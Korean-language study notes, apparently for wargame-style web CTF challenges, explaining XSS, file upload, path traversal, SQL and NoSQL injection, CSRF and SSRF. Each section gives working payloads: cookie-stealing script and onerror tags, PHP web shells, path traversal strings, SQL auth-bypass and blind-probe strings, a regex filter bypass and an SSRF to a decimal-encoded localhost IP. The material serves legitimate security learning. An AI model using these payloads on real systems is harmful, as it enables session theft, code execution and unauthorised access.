# 1. XSS (Cross-Site Scripting)

## 1.1 개념

서버가 사용자 입력을 HTML에 **이스케이프 없이** 넣으면, 브라우저는 그걸 **스크립트로 실행**한다.

이 레포 문제들은 대부분:

- `/vuln?param=` → 입력 그대로 출력  
- `/flag` → **봇(헤드리스 브라우저)** 이 그 URL을 방문  
- 봇만 가진 비밀(쿠키·admin 세션)을 우리가 볼 수 있는 곳(memo 등)으로 옮김  

**내 Application 쿠키에 flag가 없는 것이 정상.** flag 쿠키는 봇 안에만 잠깐 있다.

## 1.2 location.href

```js
location.href = "주소";
```

= 지금 탭을 그 주소로 **이동**. 주소창에 치고 엔터와 같음.

## 1.3 xss-1 (#28)

**목표:** 봇의 `flag` 쿠키를 `/memo` 에 남기기.

**페이로드 (`/flag` 제출):**

```html
<script>location.href="/memo?memo="+document.cookie</script>
```

| 조각 | 의미 |
|------|------|
| `<script>` | 이 안을 JS로 실행 |
| `document.cookie` | 봇이 가진 쿠키 읽기 (`flag=DH{...}`) |
| `location.href=...` | `/memo?memo=...` 로 이동 → 서버가 메모 저장 |

**절차:** `/flag` 제출 → `/memo` 확인 → `DH{...}` 제출.

## 1.4 xss-2 (#268)

구조는 xss-1과 같고, **`script` 문자열이 필터**된다.

**우회:** 이미지 로드 실패 시 실행되는 `onerror`.

```html
<img src=x onerror="location.href='/memo?memo='+document.cookie">
```

또는

```html
<img src=x onerror="fetch('/memo?memo='+document.cookie)">
```

`<script>` 없이도 JS가 돈다.

# 2. File Vulnerability

## 2.1 퀴즈 요지

**악성 업로드로 가능한 것 (전부):**

- Cookie Hijacking  
- Remote Code Execution  
- XSS  
- CSRF  

업로드 하나 → 웹쉘(RCE), 악성 HTML(XSS·쿠키·CSRF 유도)까지 이어질 수 있다.

**Apache PHP 실행 설정:**

```apache
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- `SetHandler` = 이 파일을 이 방식으로 처리  
- `application/x-httpd-php` = PHP 엔진으로 실행  

**다운로드 + 경로 조작 (퀴즈 Q4):**

```python
open("/data/uploads/" + filename)
```

프로세스 메모리 맵: `/proc/self/maps`  
정답 예: `../../proc/self/maps`, `../../../proc/self/maps`  
(`../` 로 루트까지 올라간 뒤 `proc/self/maps`)

`maps` = 그 프로세스 **메모리 배치 지도** (전체 RAM 덤프가 아님).

## 2.2 image-storage (#38)

**관찰:** 업로드 시 확장자 검사가 거의 없음 → `.php` 업로드 가능 → `/uploads/xxx.php` 접근 시 PHP 실행.

**웹쉘 예:**

```php
<?php echo file_get_contents('/flag.txt'); ?>
```

또는

```php
<?php system($_GET['cmd']); ?>
```

**절차:**

1. 위 내용으로 `shell.php` 저장·업로드  
2. `/uploads/shell.php` 접속  
3. `cmd` 쓰는 경우: `?cmd=cat+/flag.txt`  

**500 이 날 때:**

- 리스트만 클릭 → `?cmd=` 없음 → PHP 8에서 `system(null)` 류 TypeError 가능  
- 해결: 쿼리 붙이거나, flag 고정 출력 웹쉘 사용  
- 따옴표·BOM·문법 오류도 500  

## 2.3 file-download-1 (#37)

**관찰:**

```python
open(f'{UPLOAD_DIR}/{filename}', 'rb')  # filename 무검증
```

**절차:**

```text
/read?name=../flag.py
```

`UPLOAD_DIR` 한 단계 위의 `flag.py` (앱이 `from flag import FLAG`).  
메모 제목을 `flag.py` 로 올리는 것과 **다름** — 경로 조작으로 **서버 원본**을 읽어야 함.

# 3. SQL Injection

## 3.1 simple_sqli (#24)

**관찰 (중요):** 쿼리가 **큰따옴표** 로 감쌈.

```sql
SELECT * FROM users
WHERE userid="{userid}" AND userpassword="{userpassword}"
```

| 시도 | 결과 |
|------|------|
| `admin'--` | `'` 는 문자열 안 글자 → 실패 (wrong) |
| **`admin";--`** | `"` 닫고 뒤 주석 → 성공 |

**절차:**

| 필드 | 값 |
|------|-----|
| userid | `admin";--` (또는 `admin" --`) |
| password | 아무거나 |

`OR 1=1` 은 guest가 먼저 잡혀 guest 로그인이 될 수 있어, 이 문제는 **admin 지정 + 주석**이 정석.

## 3.2 Blind SQLi (개념 · learn #175)

결과가 테이블로 안 나오고, **예/아니오 반응**만 있을 때.

예: 응답에 `exists` / 없음.

```text
admin' and char_length(upw)=13-- -     → 길이
admin' and substr(upw,1,1)='D'-- -   → 1번째 글자
```

스크립트로 길이 → 글자 루프. simple_sqli 보다 한 단계 위.

# 4. CSRF

**CSRF:** 피해자(여기선 **봇**) 권한으로, 그 사람이 의도하지 않은 **요청**을 보내게 함.  
XSS가 “스크립트 실행·쿠키 읽기”라면, CSRF는 “**특정 URL/액션 호출**”.

GET 이면 이미지 로드만으로 요청이 간다.

```html
<img src="/위험한-경로">
```

## 4.1 csrf-1 (#26) — memo 있음

**목표:** 봇(IP 127.0.0.1)이 다음을 방문:

```text
/admin/notice_flag?userid=admin
```

→ 서버가 메모에 FLAG 기록 → **`/memo`** 에서 확인.

**`/flag` 제출:**

```html
<img src="/admin/notice_flag?userid=admin">
```

내가 직접 열면 Access Denied (IP·권한). 봇만 조건 충족.

## 4.2 csrf-2 (#269) — memo 없음

csrf-1 과 **결과가 다름.** `/memo` 를 찾지 말 것.

| | csrf-1 | csrf-2 |
|--|--------|--------|
| 봇 행동 | notice_flag → memo에 플래그 | **change_password** 로 admin 비번 변경 |
| 우리 | `/memo` | **admin / 새 비번 로그인** |

**`/flag` 제출:**

```html
<img src="/change_password?pw=1234">
```

**이후:** 로그인 `admin` / `1234` → 플래그.

봇은 이미 admin 세션을 가진 채 `/vuln` 을 연다.

# 5. NoSQL Injection (Mango #90)

## 5.1 강의 문장 이해하기

절차 예:

- Value1: `uid` = `admin` → `{"uid":"admin"}`  
- Value2: `upw[$regex]` = `^a` → `{"upw":{"$regex":"^a"}}`  

실행 쿼리 개념:

```js
db.user.find({ "uid": "admin", "upw": { "$regex": "^a" } })
```

| 기호 | 의미 |
|------|------|
| `$regex` | 비밀번호 **완전 일치**가 아니라 **패턴 매칭** |
| `^a` | **첫 글자가 a** |

매칭되면 `Hello, admin!` 같은 성공 → “첫 글자는 a” 를 알 수 있음.  
Blind SQLi 와 같이 **예/아니오로 한 글자씩** 좁힌다.

## 5.2 Mango 특이점

- 플래그 = **admin 의 upw** (`DH{...}`)  
- 필터: 요청에 **`admin`**, **`dh`**, **`admi`** 등 있으면 차단  

**uid 우회:**

```text
uid[$regex]=ad.in
```

(`ad` + 아무 1글자 + `in` → admin)

**upw 를 `^DH` 로 보내면 실패하는 이유:**  
URL에 `dh` 가 들어가 **filter**.

**우회 패턴 (안쪽 32글자 맞출 때):**

```text
upw[$regex]=D.{ + (안쪽) + (다음글자)
```

- `D.` = `D` + 임의 1글자 → 실제 `DH` 와 매칭  
- `{` = 중괄호  
- URL에는 연속 `dh` 없음  

성공 판별은 종종 응답 본문 정확히 `admin`.

# 6. SSRF (web-ssrf #75)

## 6.1 개념

**SSRF (Server-Side Request Forgery):**  
사용자가 준 URL을 **서버가 대신** 요청.  
외부에서 못 가는 **내부 서비스**를 서버 권한으로 읽을 수 있다.

## 6.2 이 문제 구조

| 항목 | 내용 |
|------|------|
| 기능 | Image Viewer — URL 받아 내용을 base64 이미지로 표시 |
| 필터 | URL에 `127.0.0.1` / `localhost` 문자열 있으면 차단 |
| 내부 | `127.0.0.1` 의 **포트 1500~1800** 랜덤, flag 제공 |
| 플래그 경로 | `/flag.txt` (또는 앱 기준 `./flag.txt`) |

## 6.3 풀이 절차

1. **IP 우회:** `127.0.0.1` → **`2130706433`** (동일 IP 10진 표기)

```text
http://2130706433:PORT/flag.txt
```

2. **PORT** 를 1500~1800 스캔 (응답 길이·내용이 다른 포트)

3. 뷰어가 보여 준 **base64** 디코드 → `DH{...}`

**스크립트 주의:**

- `HOST` 에 한글·오타 붙이지 말 것 (`11052ㅊ` 같은 실수 → 전부 실패)  
- form: 보통 `POST /img_viewer` + `url=`  
- error.png(PNG) 와 flag 텍스트 base64 구분
